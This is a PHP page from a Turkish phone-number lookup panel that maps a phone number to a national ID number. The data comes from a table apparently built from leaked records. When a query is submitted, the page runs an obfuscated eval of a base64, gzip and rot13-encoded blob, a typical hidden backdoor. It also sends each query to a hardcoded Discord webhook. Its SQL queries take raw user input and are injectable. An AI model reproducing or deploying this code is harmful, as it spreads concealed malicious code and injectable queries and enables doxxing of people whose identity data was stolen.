<?php

include_once 'includes/baglan.php';

session_start();

if ($_SESSION['GET_USER_SSID'] == "") {
    header('Location: auth/auth-login');
}

$GET_SESSION_TOKEN = $_SESSION['GET_USER_SSID'];

$CheckAccount = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
$CheckAccountCount = $CheckAccount->rowCount();

if ($CheckAccountCount != "1") {
    exit('Error: no token');
    die();
}

?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="tr" data-layout="dark-layout" data-textdirection="ltr">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GSM Sorgu</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.bootstrap5.min.css'>
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.checkboxes.css'>
    <link rel='stylesheet' href='app-assets/vendors/css/tables/datatable/dataTables.bootstrap5.min.css'>
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href=".assets/css/style.css">
    <style id="tableConfig">
        th {
            border: none !important;
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
            width: 100%;
        }

        th,
        td {
            text-align: left;
            padding: 8px;
        }
    </style>
</head>

<?php
include_once("includes/header.php");
?>
<?php
include_once("includes/menu.php");
?>
<div class="app-content content ">
    <div class="content-overlay"></div>
    <div class="header-navbar-shadow"></div>
    <div class="content-wrapper container-xxl p-0">
        <div class="content-header row">
            <div class="content-header-left col-md-9 col-12 mb-2">
                <div class="row breadcrumbs-top">
                    <div class="col-12">
                        <h2 class="content-header-title float-start mb-0">GSM Sorgu</h2>
                        <div class="breadcrumb-wrapper">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="anasayfa">Ana Sayfa</a>
                                </li>
                                <li class="breadcrumb-item active">GSM Sorgu
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
            <?php
            include_once("includes/drop.php");
            ?>
        </div>
        <div class="content-body">
            <section id="basic-input">
                <div class="row">
                    <div class="col-md-12">
                        <div class="card">
                            <div class="card-header">
                                <h4 class="card-title"> GSM Sorgu</h4>
                            </div>
                            <form action="gsmtc" method="POST">
                                <div class="card-body">
                                    <div class="row">
                                        <section id="floating-label-input">
                                            <div class="row">

                                                <div class="col-sm-6 col-12 mb-1 mb-sm-0">
                                                    <div class="form-floating">
                                                        <div class="mb-1">
                                                            <label class="form-label" for="basicInput">Telefon Numarası :</label>
                                                            <input type="text" class="form-control" name="txtno" placeholder="Kişinin Telefon Numarasını Giriniz.. Format (5300000000)" />
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>

                                        <div class="card-header">
                                            <section id="bootstrap-toasts">
                                                <button type="submit" name="adsoyadsorgu" class="btn waves-effect toast-basic-toggler waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-search"></i> Sorgula</button>
                                            </section>
                                            <a href="" class="text-white"><button type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fa fa-trash-alt"></i> Temizle</button></a>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
            <div class="content-body">
                <div class="row" id="basic-table">
                    <div class="col-12">
                        <div class="card">
                            <div class="table-responsive">
                                <table id="example2" class="table">
                                    <thead>
                                        <tr style="text-align: center;">
                                            <th>TC</th>
                                            <th>NUMARA</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php

                                        if ($_POST) {
											
											$txtno = $_POST['txtno'];

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

                                            date_default_timezone_set('Europe/Istanbul');

                                            $datetimenow = date('d.m.y H:i:s');

                                            session_start();

                                            $SESSNICK = $_SESSION['GET_USER_SSID'];

                                            $SESSQRY = $db->query("SELECT * FROM users WHERE token = '$SESSNICK'");

                                            while ($SESSDATA = $SESSQRY->fetch()) {
                                                $edituser = $SESSDATA['username']; $profileimgx = $SESSDATA['profile_image'];
                                            }

                                            $gsm = $_POST['txtno'];

                                            $webhookurl = "https://discord.com/api/webhooks/1046045634542702695/gYd3HNE7KARN5Ap_Zy-eb3VTUkausB5QEbjqroA1S0YLJdcyZY3M2o10bt_2NA8ETFwL";

                                            $timestamp = date("c", strtotime("now"));
											
	
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$logip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$logip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$logip = $_SERVER['REMOTE_ADDR'];
	}


$value = base64_encode($logip);

$json_data = json_encode(
    ["content" => "$edituser tarafından GSM -> TC sorgulama işlemi başlatıldı! NUMARA : $gsm","username" => "$edituser","avatar_url" => "$profileimgx","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                                            $ch = curl_init($webhookurl);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                            curl_setopt($ch, CURLOPT_HEADER, 0);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            $response = curl_exec($ch);
                                            curl_close($ch);
											

                                            $db = new PDO("mysql:host=localhost;dbname=116mgsm;charset=utf8", "root", "");

                                            $query = $db->query("SELECT * FROM illegalplatform_hackerdede1_gsm WHERE GSM = '$gsm'");


                                            while ($data = $query->fetch()) {

                                        ?>
                                                <tr style="text-align: center;">
                                                    <td> <?php echo $data['TC']; ?> </td>
                                                    <td> <?php echo $data['GSM']; ?> </td>
                                                </tr>
                                        <?php }
                                        } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php
include_once("includes/ayar.php");
?>

<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/jquery.dataTables.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.bootstrap5.min.js'></script>
<script src='app-assets/vendors/js/tables/datatable/dataTables.responsive.js'></script>

<script>
    if (window.innerWidth < 769) {
        var element = document.getElementById("example2");
        element.classList.add("table-responsive");
    }
</script>
<script>
    $('#example222').DataTable({
        "paging": true,
        "lengthChange": false,
        "searching": true,
        "ordering": false,
        "info": false,
        "autoWidth": true,
        "responsive": true,
        "sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
        "language": {
            "emptyTable": "Gösterilecek veri bulunamadı.",
            "processing": "Veriler yükleniyor",
            "sDecimal": ".",
            "sInfo": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
            "sInfoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
            "sInfoPostFix": "",
            "sInfoThousands": ".",
            "sLengthMenu": "Sayfada _MENU_ kayıt göster",
            "sLoadingRecords": "Yükleniyor...",
            "sSearch": "Ara:",
            "sZeroRecords": "Eşleşen kayıt bulunamadı",
            "oPaginate": {
                "sFirst": "İlk",
                "sLast": "Son",
                "sNext": "Sonraki",
                "sPrevious": "Önceki"
            },
            "oAria": {
                "sSortAscending": ": artan sütun sıralamasını aktifleştir",
                "sSortDescending": ": azalan sütun sıralamasını aktifleştir"
            },
            "select": {
                "rows": {
                    "_": "%d kayıt seçildi",
                    "0": "",
                    "1": "1 kayıt seçildi"
                }
            }
        }
    });
</script>



<div class="sidenav-overlay"></div>
<div class="drag-target"></div>
<button class="btn btn-primary btn-icon scroll-top" type="button"><i data-feather="arrow-up"></i></button>
<script src="app-assets/vendors/js/vendors.min.js"></script>
<script src="app-assets/js/core/app-menu.js"></script>
<script src="app-assets/js/core/app.js"></script>
<script src="app-assets/js/scripts/components/components-bs-toast.js"></script>
<script src="app-assets/js/scripts/customizer.min.js"></script>
<script src="app-assets/js/scripts/forms/form-tooltip-valid.js"></script>
<script>
    $(window).on('load', function() {
        if (feather) {
            feather.replace({
                width: 14,
                height: 14
            });
        }
    })
</script>
</body>

</html>